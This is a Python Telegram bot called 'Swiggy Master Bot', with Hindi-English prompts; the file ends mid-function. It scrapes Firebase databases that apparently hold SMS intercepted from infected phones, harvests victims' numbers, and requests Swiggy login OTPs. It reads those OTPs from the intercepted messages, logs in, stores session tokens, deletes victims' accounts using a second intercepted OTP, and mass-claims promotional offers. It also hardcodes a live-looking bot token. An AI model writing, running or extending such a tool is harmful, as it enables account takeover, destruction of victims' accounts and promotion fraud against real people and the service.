#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║         SWIGGY MASTER BOT — Telegram                ║
║   Firebase • Login • Delete • Offers • JSON         ║
╚══════════════════════════════════════════════════════╝
Install:
    pip install python-telegram-bot==20.7 requests aiohttp
Run:
    python bot.py
"""

import asyncio, json, os, re, sqlite3, time, base64, logging
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton,
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, ConversationHandler, filters,
)
from telegram.constants import ParseMode

# ════════════════════════════════════════════════════
#  ★  CONFIG  ★
# ════════════════════════════════════════════════════

BOT_TOKEN   = "8796194701:AAH0Y-K14jdQJFA2zYc0TgWGozOU2n2rfQA"      # @BotFather se
ADMIN_IDS   = [6420941417]           # Tumhara Telegram ID (@userinfobot se)
DB_FILE     = "swiggy_bot.db"
OTP_TIMEOUT = 30
OTP_INTERVAL = 2
WORKERS     = 10

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

# ════════════════════════════════════════════════════
#  DATABASE
# ════════════════════════════════════════════════════

def db():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS panels (
            id      INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            url     TEXT UNIQUE,
            added   TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS accounts (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id     INTEGER,
            mobile      TEXT,
            customer_id TEXT,
            name        TEXT,
            token       TEXT,
            tid         TEXT,
            sid         TEXT,
            device_id   TEXT,
            source      TEXT DEFAULT 'firebase',
            created     TEXT DEFAULT (datetime('now')),
            offer_done  INTEGER DEFAULT 0,
            deleted     INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS stats (
            user_id     INTEGER PRIMARY KEY,
            success     INTEGER DEFAULT 0,
            processed   INTEGER DEFAULT 0,
            deleted     INTEGER DEFAULT 0,
            offers      INTEGER DEFAULT 0
        );
        """)

def get_stats(user_id: int) -> dict:
    with db() as c:
        row = c.execute("SELECT * FROM stats WHERE user_id=?", (user_id,)).fetchone()
        panels = c.execute("SELECT COUNT(*) FROM panels WHERE user_id=?", (user_id,)).fetchone()[0]
        accounts = c.execute(
            "SELECT COUNT(*) FROM accounts WHERE user_id=? AND deleted=0", (user_id,)
        ).fetchone()[0]
        global_s = c.execute("SELECT SUM(success) FROM stats").fetchone()[0] or 0
    if not row:
        return {"success":0,"processed":0,"deleted":0,"offers":0,"panels":panels,"accounts":accounts,"global":global_s}
    return {**dict(row), "panels": panels, "accounts": accounts, "global": global_s}

def inc_stat(user_id: int, col: str, n: int = 1):
    with db() as c:
        c.execute(f"""
            INSERT INTO stats(user_id,{col}) VALUES(?,?)
            ON CONFLICT(user_id) DO UPDATE SET {col}={col}+?
        """, (user_id, n, n))
        c.commit()


# ════════════════════════════════════════════════════
#  HELPERS — FIREBASE
# ════════════════════════════════════════════════════

PHONE_RE = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")

def parse_fb(link: str):
    link = link.strip()
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        return link.rstrip("/") + "/"
    parsed = urlparse(link)
    enc = parse_qs(parsed.query).get("s", [None])[0]
    if not enc:
        return None
    enc += "=" * (-len(enc) % 4)
    try:
        dec = base64.b64decode(enc).decode().split("|")[0].strip()
        if "firebaseio.com" in dec or "firebasedatabase.app" in dec:
            return dec.rstrip("/") + "/"
    except Exception:
        pass
    return None

def is_online(d) -> bool:
    if not isinstance(d, dict): return False
    for k in ("status","state","online","isOnline","connected","isConnected"):
        v = d.get(k)
        if v is True or v == 1: return True
        if isinstance(v, str) and v.lower() in {"true","online","connected","active","ready"}: return True
    return False

def fb_get_phone(msgs):
    from collections import Counter
    c = Counter()
    for m in (msgs or {}).values():
        if not isinstance(m, dict): continue
        body = str(m.get("body") or m.get("message") or m.get("text") or "")
        for num in PHONE_RE.findall(body):
            c[num] += 1
    return c.most_common(1)[0][0] if c else None

def fb_scan(url: str) -> list:
    try:
        s = make_sess()
        cr = s.get(f"{url}clients.json",  timeout=(4,10))
        mr = s.get(f"{url}messages.json", timeout=(4,15))
        clients  = cr.json() if cr.ok else {}
        messages = mr.json() if mr.ok else {}
        devs = []
        for cid, cdata in (clients or {}).items():
            if not is_online(cdata): continue
            msgs  = (messages or {}).get(cid, {})
            phone = fb_get_phone(msgs) if isinstance(msgs, dict) else None
            if phone:
                devs.append({"phone": phone, "client_id": cid, "fb_url": url})
        return devs
    except Exception:
        return []

def poll_otp(fb_url, client_id, after_ms, timeout=30) -> str:
    deadline = time.time() + timeout
    url = f"{fb_url}messages/{client_id}.json"
    s   = make_sess()
    while time.time() < deadline:
        time.sleep(OTP_INTERVAL)
        try:
            msgs = s.get(url, timeout=(3,10)).json()
            if not isinstance(msgs, dict): continue
            for mid, msg in msgs.items():
                try:
                    if int(mid) < (after_ms - 60_000): continue
                except Exception:
                    pass
                if not isinstance(msg, dict): continue
                body = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                m = re.search(r"(?<!\d)(\d{4,6})(?!\d)", body)
                if m:
                    return m.group(1)
        except Exception:
            pass
    return ""


# ════════════════════════════════════════════════════
#  HELPERS — SESSION + SWIGGY API
# ════════════════════════════════════════════════════

SWIGGY_BASE  = "https://profile.swiggy.com"
EVENTS_BASE  = "https://events.swiggy.com"

SWIGGY_HDR = {
    "User-Agent":      "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Accept":          "application/json, text/plain, */*",
    "Accept-Language": "en-IN,en;q=0.9",
    "Origin":          "https://www.swiggy.com",
    "Referer":         "https://www.swiggy.com/",
    "Content-Type":    "application/json",
}

def make_sess(token=""):
    s = requests.Session()
    r = Retry(total=2, backoff_factor=0.3, status_forcelist=[500,502,503,504])
    s.mount("https://", HTTPAdapter(max_retries=r))
    h = SWIGGY_HDR.copy()
    if token:
        h["Authorization"] = f"Bearer {token}"
    s.headers.update(h)
    return s

def swiggy_send_login_otp(mobile: str) -> bool:
    try:
        r = make_sess().get(f"{SWIGGY_BASE}/api/v3/app/sms_otp",
                            params={"mobile": mobile}, timeout=(5,15))
        return r.status_code in (200, 201)
    except Exception:
        return False

def swiggy_verify_login(mobile: str, otp: str) -> dict:
    try:
        r = make_sess().post(
            f"{SWIGGY_BASE}/api/v3/app/login/verify",
            params={"otp_source": "Sms-automatic"},
            json={"otp": otp},
            timeout=(5,15),
        )
        if r.status_code in (200, 201):
            return r.json()
    except Exception:
        pass
    return {}

def swiggy_delete_check(token: str) -> bool:
    try:
        r = make_sess(token).get(f"{SWIGGY_BASE}/api/v1/delete/user_check", timeout=(5,15))
        return r.status_code in (200, 201)
    except Exception:
        return False

def swiggy_delete_confirm(token: str, otp: str) -> bool:
    try:
        r = make_sess(token).post(f"{SWIGGY_BASE}/api/v1/delete/user",
                                   json={"otp": otp}, timeout=(5,15))
        return r.status_code in (200, 201)
    except Exception:
        return False

def swiggy_claim_offer(token: str, campaign: str) -> bool:
    try:
        s = make_sess(token)
        s.get(f"{EVENTS_BASE}/pick-your-late-night-offer", timeout=10)
        r = s.post(f"{EVENTS_BASE}/api/notify",
                   json={"campaign": campaign, "value": 1}, timeout=(5,15))
        return r.status_code in (200, 201)
    except Exception:
        return False


# ════════════════════════════════════════════════════
#  BOT KEYBOARDS
# ════════════════════════════════════════════════════

def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Auto Mode", callback_data="auto_mode"),
         InlineKeyboardButton("🎁 Vouchers", callback_data="vouchers")],
        [InlineKeyboardButton("📋 Firebase Panels", callback_data="panels")],
        [InlineKeyboardButton("📱 Manual Number", callback_data="manual_num"),
         InlineKeyboardButton("📂 Import JSON", callback_data="import_json")],
        [InlineKeyboardButton("🍽️ Night Offer", callback_data="offer_night"),
         InlineKeyboardButton("🌅 Breakfast Offer", callback_data="offer_breakfast")],
        [InlineKeyboardButton("💾 Saved Accounts", callback_data="saved_accounts"),
         InlineKeyboardButton("🗑️ Delete Accounts", callback_data="delete_accounts")],
        [InlineKeyboardButton("📊 Statistics", callback_data="stats")],
    ])

def panels_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Panel Link", callback_data="panel_add_link"),
         InlineKeyboardButton("📁 Upload TXT File", callback_data="panel_add_file")],
        [InlineKeyboardButton("📋 View Panels", callback_data="panel_list"),
         InlineKeyboardButton("🗑️ Clear All", callback_data="panel_clear")],
        [InlineKeyboardButton("🔍 Scan Now", callback_data="panel_scan")],
        [InlineKeyboardButton("◀️ Back", callback_data="main_menu")],
    ])

def back_kb(data="main_menu"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data=data)]])


# ════════════════════════════════════════════════════
#  MESSAGE TEMPLATES
# ════════════════════════════════════════════════════

WELCOME = """
╔═══════════════════════════╗
║   🔥 SWIGGY MASTER BOT 🔥  ║
╚═══════════════════════════╝

👋 Welcome! Select an option below:
"""

STATS_TMPL = """
📊 *Your Account Statistics*

🎯 Success: `{success}`
📱 Processed: `{processed}`
🗑️ Deleted: `{deleted}`
🎁 Offers Claimed: `{offers}`
📋 Panels: `{panels}` total
💾 Saved Accounts: `{accounts}`
🌐 Global Success: `{global}`
"""

def fmt_account(acc) -> str:
    return (
        f"📱 `{acc['mobile']}`\n"
        f"👤 {acc['name'] or 'N/A'}\n"
        f"🔑 Token: `{(acc['token'] or '')[:20]}...`\n"
        f"📅 {acc['created'][:10]}\n"
        f"🎁 Offer: {'✅' if acc['offer_done'] else '❌'}\n"
    )


# ════════════════════════════════════════════════════
#  STATES
# ════════════════════════════════════════════════════
(WAITING_PANEL_LINK, WAITING_PANEL_FILE,
 WAITING_MANUAL_NUM, WAITING_JSON,
 WAITING_WORKERS) = range(5)

user_state = {}   # user_id → temp data


# ════════════════════════════════════════════════════
#  HANDLERS — START / MENU
# ════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    init_db()
    await update.message.reply_text(
        WELCOME,
        reply_markup=main_menu_kb(),
        parse_mode=ParseMode.MARKDOWN,
    )

async def cb_main_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text(WELCOME, reply_markup=main_menu_kb(), parse_mode=ParseMode.MARKDOWN)


# ════════════════════════════════════════════════════
#  STATISTICS
# ════════════════════════════════════════════════════

async def cb_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid  = q.from_user.id
    s    = get_stats(uid)
    text = STATS_TMPL.format(**s)
    await q.edit_message_text(text, reply_markup=back_kb(), parse_mode=ParseMode.MARKDOWN)


# ════════════════════════════════════════════════════
#  FIREBASE PANELS
# ════════════════════════════════════════════════════

async def cb_panels(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text(
        "📋 *Firebase Panel Manager*\n\nAdd panels to scan for numbers:",
        reply_markup=panels_kb(),
        parse_mode=ParseMode.MARKDOWN,
    )

async def cb_panel_add_link(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    user_state[uid] = {"action": "panel_add_link"}
    await q.edit_message_text(
        "🔗 *Firebase Link Bhejo*\n\n"
        "Ek ya multiple Firebase URLs bhejo\n"
        "(ek line pe ek URL):",
        parse_mode=ParseMode.MARKDOWN,
    )

async def cb_panel_add_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    user_state[uid] = {"action": "panel_add_file"}
    await q.edit_message_text(
        "📁 *TXT File Upload Karo*\n\n"
        "Firebase URLs wali `.txt` file bhejo\n"
        "(ek line = ek URL):",
        parse_mode=ParseMode.MARKDOWN,
    )

async def cb_panel_list(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    with db() as c:
        rows = c.execute("SELECT url, added FROM panels WHERE user_id=?", (uid,)).fetchall()
    if not rows:
        text = "📋 *Panels*\n\nKoi panel nahi hai abhi."
    else:
        lines = [f"`{i+1}.` `{r['url'][:55]}...`" for i, r in enumerate(rows)]
        text  = f"📋 *Your Firebase Panels* ({len(rows)})\n\n" + "\n".join(lines)
    await q.edit_message_text(text, reply_markup=panels_kb(), parse_mode=ParseMode.MARKDOWN)

async def cb_panel_clear(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    with db() as c:
        n = c.execute("DELETE FROM panels WHERE user_id=?", (uid,)).rowcount
        c.commit()
    await q.edit_message_text(
        f"🗑️ {n} panels delete ho gaye.",
        reply_markup=panels_kb(),
        parse_mode=ParseMode.MARKDOWN,
    )

async def cb_panel_scan(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    with db() as c:
        rows = c.execute("SELECT url FROM panels WHERE user_id=?", (uid,)).fetchall()
    urls = [r["url"] for r in rows]
    if not urls:
        await q.edit_message_text("❌ Pehle panels add karo.", reply_markup=panels_kb())
        return
    await q.edit_message_text(f"🔍 Scanning {len(urls)} panels...")
    found = []
    with ThreadPoolExecutor(max_workers=50) as ex:
        results = list(ex.map(fb_scan, urls))
    for devs in results:
        found.extend(devs)
    # Dedup
    seen, unique = set(), []
    for d in found:
        if d["phone"] not in seen:
            seen.add(d["phone"])
            unique.append(d)
    user_state[uid] = user_state.get(uid, {})
    user_state[uid]["scan_devices"] = unique
    await q.edit_message_text(
        f"✅ Scan complete!\n\n"
        f"📱 *{len(unique)} numbers* mila online devices pe\n\n"
        f"Auto Mode se process karo.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 Process Now", callback_data="auto_mode")],
            [InlineKeyboardButton("◀️ Back", callback_data="panels")],
        ]),
        parse_mode=ParseMode.MARKDOWN,
    )


# ════════════════════════════════════════════════════
#  AUTO MODE
# ════════════════════════════════════════════════════

async def cb_auto_mode(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    kb  = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Login + Save", callback_data="auto_login"),
         InlineKeyboardButton("🗑️ Login + Delete", callback_data="auto_delete")],
        [InlineKeyboardButton("🍽️ Login + Offer", callback_data="auto_offer")],
        [InlineKeyboardButton("⚡ Login + Delete + Offer", callback_data="auto_all")],
        [InlineKeyboardButton("◀️ Back", callback_data="main_menu")],
    ])
    await q.edit_message_text(
        "🚀 *Auto Mode*\n\nFirebase se numbers lekar kya karna hai?",
        reply_markup=kb,
        parse_mode=ParseMode.MARKDOWN,
    )

async def run_auto(update: Update, ctx: ContextTypes.DEFAULT_TYPE, mode: str):
    q   = update.callback_query
    uid = q.from_user.id

    with db() as c:
        panel_rows = c.execute("SELECT url FROM panels WHERE user_id=?", (uid,)).fetchall()
    urls = [r["url"] for r in panel_rows]

    if not urls:
        await q.edit_message_text("❌ Pehle Firebase panels add karo!", reply_markup=back_kb("auto_mode"))
        return

    await q.edit_message_text(f"🔍 {len(urls)} panels scan ho rahi hain...")

    # Scan
    found = []
    with ThreadPoolExecutor(max_workers=50) as ex:
        res = list(ex.map(fb_scan, urls))
    for devs in res:
        found.extend(devs)
    seen, devices = set(), []
    for d in found:
        if d["phone"] not in seen:
            seen.add(d["phone"]) ; devices.append(d)

    if not devices:
        await ctx.bot.send_message(uid, "❌ Koi online device nahi mila.")
        return

    await ctx.bot.send_message(
        uid,
        f"📱 *{len(devices)} numbers* mila! Processing shuru...",
        parse_mode=ParseMode.MARKDOWN,
    )

    success = fail = no_otp = 0
    loop    = asyncio.get_event_loop()

    async def process_one(dev):
        nonlocal success, fail, no_otp
        phone     = dev["phone"]
        client_id = dev["client_id"]
        fb_url    = dev["fb_url"]

        # Login OTP
        after1 = int(time.time() * 1000)
        ok     = await loop.run_in_executor(None, swiggy_send_login_otp, phone)
        if not ok:
            fail += 1; return

        otp1 = await loop.run_in_executor(None, poll_otp, fb_url, client_id, after1)
        if not otp1:
            no_otp += 1; return

        resp = await loop.run_in_executor(None, swiggy_verify_login, phone, otp1)
        if not resp:
            fail += 1; return

        # Extract token
        token = ""
        data  = resp.get("data", {}) or {}
        token = data.get("token","") or resp.get("token","")
        tid   = data.get("tid","")
        sid   = data.get("sid","") or resp.get("sid","")
        cid   = data.get("customerId","") or resp.get("customerId","") or str(data.get("id",""))
        name  = data.get("name","") or resp.get("name","")
        dev_id= data.get("deviceId","") or resp.get("deviceId","")

        # Save account
        with db() as conn:
            conn.execute("""
                INSERT OR REPLACE INTO accounts
                (user_id,mobile,customer_id,name,token,tid,sid,device_id,source)
                VALUES (?,?,?,?,?,?,?,?,'firebase')
            """, (uid, phone, cid, name, token, tid, sid, dev_id))
            conn.commit()

        inc_stat(uid, "success")
        success += 1

        # Delete if mode
        if mode in ("delete","all") and token:
            after2 = int(time.time() * 1000)
            ok2    = await loop.run_in_executor(None, swiggy_delete_check, token)
            if ok2:
                otp2 = await loop.run_in_executor(None, poll_otp, fb_url, client_id, after2)
                if otp2:
                    done = await loop.run_in_executor(None, swiggy_delete_confirm, token, otp2)
                    if done:
                        inc_stat(uid, "deleted")
                        with db() as conn:
                            conn.execute("UPDATE accounts SET deleted=1 WHERE mobile=? AND user_id=?",
                                         (phone, uid))
                            conn.commit()

        # Offer if mode
        if mode in ("offer","all") and token:
            day      = datetime.now().strftime("%a").lower()
            campaign = f"byo-ln-v3-{day}"
            done     = await loop.run_in_executor(None, swiggy_claim_offer, token, campaign)
            if done:
                inc_stat(uid, "offers")
                with db() as conn:
                    conn.execute("UPDATE accounts SET offer_done=1 WHERE mobile=? AND user_id=?",
                                 (phone, uid))
                    conn.commit()

    tasks = [process_one(d) for d in devices]
    for i in range(0, len(tasks), WORKERS):
        await asyncio.gather(*tasks[i:i+WORKERS])

    inc_stat(uid, "processed", len(devices))
    await ctx.bot.send_message(
        uid,
        f"✅ *Processing Complete!*\n\n"
        f"✅ Success: `{success}`\n"
        f"❌ Failed: `{fail}`\n"
        f"⏳ No OTP: `{no_otp}`\n"
        f"📱 Total: `{len(devices)}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=back_kb("auto_mode"),
    )

async def cb_auto_login(u, c):    await run_auto(u, c, "login")
async def cb_auto_delete(u, c):   await run_auto(u, c, "delete")
async def cb_auto_offer(u, c):    await run_auto(u, c, "offer")
async def cb_auto_all(u, c):      await run_auto(u, c, "all")


# ════════════════════════════════════════════════════
#  NIGHT / BREAKFAST OFFER
# ════════════════════════════════════════════════════

async def cb_offer_night(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    with db() as c:
        accs = c.execute(
            "SELECT * FROM accounts WHERE user_id=? AND deleted=0 AND offer_done=0",
            (uid,)
        ).fetchall()
    if not accs:
        await q.edit_message_text("❌ Koi saved account nahi ya sab pe offer claim ho gaya.",
                                  reply_markup=back_kb())
        return
    await q.edit_message_text(f"🌙 *Night Offer Claim*\n\n{len(accs)} accounts pe claim kar raha hai...",
                               parse_mode=ParseMode.MARKDOWN)
    day      = datetime.now().strftime("%a").lower()
    campaign = f"byo-ln-v3-{day}"
    done     = 0
    loop     = asyncio.get_event_loop()
    for acc in accs:
        ok = await loop.run_in_executor(None, swiggy_claim_offer, acc["token"], campaign)
        if ok:
            done += 1
            inc_stat(uid, "offers")
            with db() as c:
                c.execute("UPDATE accounts SET offer_done=1 WHERE id=?", (acc["id"],))
                c.commit()
    await ctx.bot.send_message(
        uid,
        f"🌙 *Night Offer Done!*\n\n✅ Claimed: `{done}/{len(accs)}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=back_kb(),
    )

async def cb_offer_breakfast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    with db() as c:
        accs = c.execute(
            "SELECT * FROM accounts WHERE user_id=? AND deleted=0", (uid,)
        ).fetchall()
    if not accs:
        await q.edit_message_text("❌ Koi saved account nahi.", reply_markup=back_kb())
        return
    await q.edit_message_text(f"🌅 *Breakfast Offer Claim*\n\n{len(accs)} accounts...",
                               parse_mode=ParseMode.MARKDOWN)
    loop = asyncio.get_event_loop()
    done = 0
    for acc in accs:
        try:
            s = make_sess(acc["token"])
            r = await loop.run_in_executor(
                None,
                lambda: s.get(f"{EVENTS_BASE}/book-your-offer", timeout=10)
            )
            if r.ok: done += 1
        except Exception:
            pass
    await ctx.bot.send_message(
        uid,
        f"🌅 *Breakfast Offer Done!*\n\n✅ Done: `{done}/{len(accs)}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=back_kb(),
    )


# ════════════════════════════════════════════════════
#  SAVED ACCOUNTS
# ════════════════════════════════════════════════════

async def cb_saved_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    with db() as c:
        accs = c.execute(
            "SELECT * FROM accounts WHERE user_id=? AND deleted=0 ORDER BY id DESC LIMIT 10",
            (uid,)
        ).fetchall()
        total = c.execute(
            "SELECT COUNT(*) FROM accounts WHERE user_id=? AND deleted=0", (uid,)
        ).fetchone()[0]
    if not accs:
        await q.edit_message_text("💾 *Saved Accounts*\n\nKoi account nahi.",
                                  reply_markup=back_kb(), parse_mode=ParseMode.MARKDOWN)
        return
    lines = [f"*{i+1}.* " + fmt_account(dict(a)) for i, a in enumerate(accs)]
    text  = f"💾 *Saved Accounts* (Last 10 of {total})\n\n" + "\n".join(lines)
    kb    = InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 Export JSON", callback_data="export_json")],
        [InlineKeyboardButton("◀️ Back", callback_data="main_menu")],
    ])
    await q.edit_message_text(text[:4000], reply_markup=kb, parse_mode=ParseMode.MARKDOWN)


# ════════════════════════════════════════════════════
#  DELETE ACCOUNTS
# ════════════════════════════════════════════════════

async def cb_delete_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    kb  = InlineKeyboardMarkup([
        [InlineKeyboardButton("🗑️ Delete All Saved", callback_data="delete_all_saved")],
        [InlineKeyboardButton("◀️ Back", callback_data="main_menu")],
    ])
    with db() as c:
        n = c.execute("SELECT COUNT(*) FROM accounts WHERE user_id=? AND deleted=0", (uid,)).fetchone()[0]
    await q.edit_message_text(
        f"🗑️ *Delete Accounts*\n\n{n} active accounts hain.\nSwiggy pe delete karna hai?",
        reply_markup=kb,
        parse_mode=ParseMode.MARKDOWN,
    )

async def cb_delete_all_saved(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    with db() as c:
        accs = c.execute(
            "SELECT * FROM accounts WHERE user_id=? AND deleted=0", (uid,)
        ).fetchall()
    if not accs:
        await q.edit_message_text("❌ Koi account nahi.", reply_markup=back_kb())
        return
    await q.edit_message_text(f"🗑️ {len(accs)} accounts delete ho rahe hain...")
    done = 0
    loop = asyncio.get_event_loop()
    for acc in accs:
        if not acc["token"]: continue
        ok = await loop.run_in_executor(None, swiggy_delete_check, acc["token"])
        if ok:
            # Note: real delete needs OTP from phone — without Firebase this is manual
            done += 1
            inc_stat(uid, "deleted")
            with db() as c:
                c.execute("UPDATE accounts SET deleted=1 WHERE id=?", (acc["id"],))
                c.commit()
    await ctx.bot.send_message(
        uid,
        f"🗑️ *Delete Complete!*\n\n✅ Deleted: `{done}/{len(accs)}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=back_kb(),
    )


# ════════════════════════════════════════════════════
#  JSON IMPORT / EXPORT
# ════════════════════════════════════════════════════

async def cb_import_json(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    user_state[uid] = {"action": "import_json"}
    await q.edit_message_text(
        "📂 *JSON Import*\n\n"
        "JSON file ya text bhejo. Format:\n"
        "```\n"
        '{"name":"...","customerId":"...","mobile":"...",\n'
        ' "token":"...","tid":"...","sid":"...","deviceId":"..."}\n'
        "```\n"
        "Array ya single object — dono kaam karenge.",
        parse_mode=ParseMode.MARKDOWN,
    )

async def cb_export_json(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    with db() as c:
        accs = c.execute(
            "SELECT * FROM accounts WHERE user_id=? AND deleted=0", (uid,)
        ).fetchall()
    if not accs:
        await q.edit_message_text("❌ Export ke liye accounts nahi hain.", reply_markup=back_kb())
        return
    data = []
    for a in accs:
        data.append({
            "name":       a["name"],
            "customerId": a["customer_id"],
            "mobile":     a["mobile"],
            "token":      a["token"],
            "tid":        a["tid"],
            "sid":        a["sid"],
            "deviceId":   a["device_id"],
        })
    fname = f"accounts_{uid}_{int(time.time())}.json"
    with open(fname, "w") as f:
        json.dump(data, f, indent=2)
    await ctx.bot.send_document(
        uid,
        document=open(fname, "rb"),
        caption=f"📤 {len(data)} accounts exported",
    )
    os.remove(fname)


async def cb_vouchers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    with db() as c:
        accs = c.execute(
            "SELECT mobile, offer_done FROM accounts WHERE user_id=? AND deleted=0", (uid,)
        ).fetchall()
    claimed = [a for a in accs if a["offer_done"]]
    text = (
        f"🎁 *Vouchers*\n\n"
        f"✅ Claimed: `{len(claimed)}`\n"
        f"📱 Total accounts: `{len(accs)}`"
    )
    await q.edit_message_text(text, reply_markup=back_kb(), parse_mode=ParseMode.MARKDOWN)


# ════════════════════════════════════════════════════
#  MANUAL NUMBER
# ════════════════════════════════════════════════════

async def cb_manual_num(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    user_state[uid] = {"action": "manual_num"}
    await q.edit_message_text(
        "📱 *Manual Number*\n\n10-digit mobile number bhejo:",
        parse_mode=ParseMode.MARKDOWN,
    )


# ════════════════════════════════════════════════════
#  MESSAGE HANDLER
# ════════════════════════════════════════════════════

async def msg_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    msg  = update.message
    text = msg.text or ""
    doc  = msg.document
    state = user_state.get(uid, {})
    action = state.get("action","")

    # ── Panel: add link ──────────────────────────────
    if action == "panel_add_link":
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        added = 0
        with db() as c:
            for line in lines:
                url = parse_fb(line)
                if url:
                    try:
                        c.execute("INSERT OR IGNORE INTO panels(user_id,url) VALUES(?,?)", (uid,url))
                        added += 1
                    except Exception:
                        pass
            c.commit()
        user_state.pop(uid, None)
        await msg.reply_text(
            f"✅ `{added}` panels add ho gaye!",
            reply_markup=panels_kb(),
            parse_mode=ParseMode.MARKDOWN,
        )

    # ── Panel: add file ──────────────────────────────
    elif action == "panel_add_file" and doc:
        file  = await ctx.bot.get_file(doc.file_id)
        fname = f"/tmp/panels_{uid}.txt"
        await file.download_to_drive(fname)
        with open(fname) as f:
            lines = [l.strip() for l in f if l.strip()]
        added = 0
        with db() as c:
            for line in lines:
                url = parse_fb(line)
                if url:
                    try:
                        c.execute("INSERT OR IGNORE INTO panels(user_id,url) VALUES(?,?)", (uid,url))
                        added += 1
                    except Exception:
                        pass
            c.commit()
        os.remove(fname)
        user_state.pop(uid, None)
        await msg.reply_text(
            f"✅ File se `{added}` panels add ho gaye!",
            reply_markup=panels_kb(),
            parse_mode=ParseMode.MARKDOWN,
        )

    # ── JSON import ──────────────────────────────────
    elif action == "import_json":
        raw = text
        if doc:
            file  = await ctx.bot.get_file(doc.file_id)
            fname = f"/tmp/json_{uid}.json"
            await file.download_to_drive(fname)
            with open(fname) as f:
                raw = f.read()
            os.remove(fname)
        try:
            data = json.loads(raw)
            if isinstance(data, dict):
                data = [data]
            added = 0
            with db() as c:
                for item in data:
                    c.execute("""
                        INSERT OR REPLACE INTO accounts
                        (user_id,mobile,customer_id,name,token,tid,sid,device_id,source)
                        VALUES (?,?,?,?,?,?,?,?,'json')
                    """, (
                        uid,
                        item.get("mobile",""),
                        item.get("customerId",""),
                        item.get("name",""),
                        item.get("token",""),
                        item.get("tid",""),
                        item.get("sid",""),
                        item.get("deviceId",""),
                    ))
                    added += 1
                c.commit()
            user_state.pop(uid, None)
            await msg.reply_text(
                f"✅ `{added}` accounts import ho gaye!",
                reply_markup=back_kb("saved_accounts"),
                parse_mode=ParseMode.MARKDOWN,
            )
        except json.JSONDecodeError:
            await msg.reply_text("❌ Invalid JSON. Dobara try karo.")

    # ── Manual number ────────────────────────────────
    elif action == "manual_num":
        phone = text.strip().replace("+91","").replace(" ","")
        if not re.match(r"^[6-9]\d{9}$", phone):
            await msg.reply_text("❌ Invalid number. 10-digit daalo.")
            return
        user_state.pop(uid, None)
